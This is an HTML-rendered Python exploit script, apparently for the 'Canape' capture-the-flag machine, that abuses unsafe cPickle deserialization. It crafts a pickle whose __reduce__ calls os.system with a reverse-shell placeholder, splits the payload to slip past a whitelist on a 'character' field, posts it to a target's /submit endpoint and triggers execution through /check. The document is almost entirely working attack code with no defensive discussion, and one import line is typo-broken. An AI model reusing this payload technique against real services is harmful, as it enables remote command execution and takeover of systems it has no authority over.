<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Exploit-cPickle.py</title>
</head><body>#!/usr/bin/env python<br/>
#Canape is writing request to a file and having cpickle read it later<br/>
<br/>
import os<br/>
importcPickle<br/>
from hashlib import md5<br/>
import requests<br/>
<br/>
class PleaseSubscribe(object):<br/>
&nbsp; &nbsp; def __reduce__(self):<br/>
&nbsp; &nbsp; &nbsp; &nbsp; # The website is using "char + quote" and the "char" needs to pass a whitelist<br/>
&nbsp; &nbsp; &nbsp; &nbsp; # so we need to have a character in the first part of our pickle. We can split it.<br/>
&nbsp; &nbsp; &nbsp; &nbsp; return (os.system, ('echo homer!;rev shell here',))<br/>
<br/>
#pickle up the class<br/>
sc = cPickle.dumps(PleaseSubscribe())<br/>
<br/>
char, quote = sc.split("!")<br/>
p_id = md5(char + quote).hexdigest()<br/>
<br/>
#test the pickle on local first<br/>
#cPickle.loads(char + quote)<br/>
<br/>
#Submit<br/>
requests.post("http://&lt;RHOST&gt;:&lt;RPORT&gt;/submit", data={'character': char, 'quote': quote})<br/>
<br/>
#Check<br/>
requests.post("http://&lt;RHOST&gt;:&lt;RPORT&gt;/check", data={'id': p_id})</body></html>